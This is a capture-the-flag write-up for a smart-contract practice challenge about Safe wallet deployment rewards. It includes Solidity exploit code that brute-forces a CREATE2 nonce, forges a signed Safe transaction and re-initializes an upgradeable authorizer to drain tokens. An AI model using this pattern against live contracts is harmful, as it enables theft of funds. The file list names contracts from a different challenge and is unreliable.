# Wallet Mining

## Challenge Overview
There's a contract that incentivizes users to deploy Safe wallets, rewarding them with 1 DVT. It integrates with an upgradeable authorization mechanism, only allowing certain deployers (a.k.a. wards) to be paid for specific deployments.

The deployer contract only works with a Safe factory and copy set during deployment. It looks like the [Safe singleton factory](https://github.com/safe-global/safe-singleton-factory) is already deployed.

The team transferred 20 million DVT tokens to a user at `0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496`, where her plain 1-of-1 Safe was supposed to land. But they lost the nonce they should use for deployment.

## Vulnerability Report

### Severity
High - Allows unauthorized access to funds and reward tokens

### Vulnerability Type
- Authorization Bypass
- Unsafe Contract Deployment
- Reward System Exploitation

### Root Cause
1. **Authorization Mechanism Flaw**:
   - The system allows any address to be authorized as a ward for a specific target address
   - No validation of the deployed contract's code or functionality
   - The `drop` function only checks if the deployed address matches the target

2. **Safe Transaction Signing**:
   The system uses EIP-712 for transaction signing with two critical type hashes:
   ```bash
   # Domain Separator Type Hash
   cast keccak "EIP712Domain(uint256 chainId,address verifyingContract)"
   # Output: 0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218

   # Safe Transaction Type Hash
   cast keccak "SafeTx(address to,uint256 value,bytes data,uint8 operation,uint256 safeTxGas,uint256 baseGas,uint256 gasPrice,address gasToken,address refundReceiver,uint256 nonce)"
   # Output: 0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8
   ```

### Proof of Concept

#### Exploit Contract
```solidity
contract Exploit {
    constructor (
        DamnValuableToken token,
        AuthorizerUpgradeable authorizer,
        WalletDeployer walletDeployer,
        address safe,
        address ward,
        bytes memory initializer,
        uint256 saltNonce,
        bytes memory txData
    ) {
        // Set up authorization
        address[] memory wards = new address[](1);
        address[] memory aims = new address[](1);
        wards[0] = address(this);
        aims[0] = safe;

        // Execute exploit sequence
        authorizer.init(wards, aims);
        walletDeployer.drop(address(safe), initializer, saltNonce);
        token.transfer(ward, token.balanceOf(address(this)));
    }
}
```

#### Attack Steps
1. **Find Correct Nonce**:
```solidity
function findCorrectNonce() private view returns (uint256 nonce, bytes memory initializer) {
    address[] memory owner = new address[](1);
    owner[0] = user;
    initializer = abi.encodeCall(Safe.setup, (owner, 1, address(0), "",
                                    address(0), address(0), 0, payable(0)));
    
    while(true) {
        address target = vm.computeCreate2Address(
            keccak256(abi.encodePacked(keccak256(initializer), nonce)),
            keccak256(abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(address(singletonCopy))))),
            address(proxyFactory)
        );
        if (target == USER_DEPOSIT_ADDRESS) {
            break;
        }
        nonce++;
    }
    return (nonce, initializer);
}
```

2. **Prepare Transaction Data**:
```solidity
function prepareExecTransactionData() private view returns (bytes memory) {
    bytes memory data = abi.encodeWithSelector(token.transfer.selector, user, DEPOSIT_TOKEN_AMOUNT);
    
    // Calculate Safe transaction hash
    bytes32 safeTxHash = keccak256(
        abi.encode(
            0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8,
            address(token),
            0,
            keccak256(data),
            Enum.Operation.Call,
            100000,
            100000,
            0,
            address(0),
            address(0),
            0
        )
    );

    // Calculate domain separator
    bytes32 domainSeparator = keccak256(abi.encode(
        0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218,
        singletonCopy.getChainId(),
        USER_DEPOSIT_ADDRESS
    ));

    // Sign and return execution data
    bytes32 txHash = keccak256(abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator, safeTxHash));
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);
    bytes memory signatures = abi.encodePacked(r, s, v);
    
    return abi.encodeWithSelector(
        singletonCopy.execTransaction.selector, 
        address(token), 
        0, 
        data, 
        Enum.Operation.Call, 
        100000, 
        100000, 
        0, 
        address(0), 
        address(0), 
        signatures
    );
}
```

3. **Execute Attack**:
```solidity
function test_walletMining() public checkSolvedByPlayer {
    (uint256 nonce, bytes memory initializer) = findCorrectNonce();
    bytes memory execData = prepareExecTransactionData();
    new Exploit(token, authorizer, walletDeployer, USER_DEPOSIT_ADDRESS, ward, initializer, nonce, execData);
}
```

### Impact
1. Unauthorized access to reward tokens
2. Ability to deploy malicious contracts at target addresses
3. Potential fund drainage from the system
4. Compromise of the Safe wallet deployment mechanism

### Recommendations
1. Implement strict validation of deployed contracts
2. Add checks to verify the deployed contract is a valid Safe wallet
3. Restrict authorization to trusted addresses only
4. Add additional security measures in the `drop` function
5. Implement proper access controls for the authorization mechanism

### Prevention
1. Use a whitelist for authorized deployers
2. Verify contract code before deployment
3. Implement proper access controls
4. Add validation checks in the deployment process
5. Use a more secure authorization mechanism

## File Structure
- `WalletDeployer.sol`: Main contract that handles wallet deployment and rewards
- `AuthorizerUpgradeable.sol`: Upgradeable contract for managing deployment authorizations
- `ClimberConstants.sol`: Contains constant values used in the contracts
- `ClimberErrors.sol`: Custom error definitions
- `ClimberTimelock.sol`: Timelock contract for managing operations
- `ClimberVault.sol`: Vault contract for storing tokens

## Challenge Goal
You must save all funds before it's too late! Recover all tokens from the wallet deployer contract and send them to the corresponding ward. Also save and return all user's funds. In a single transaction.

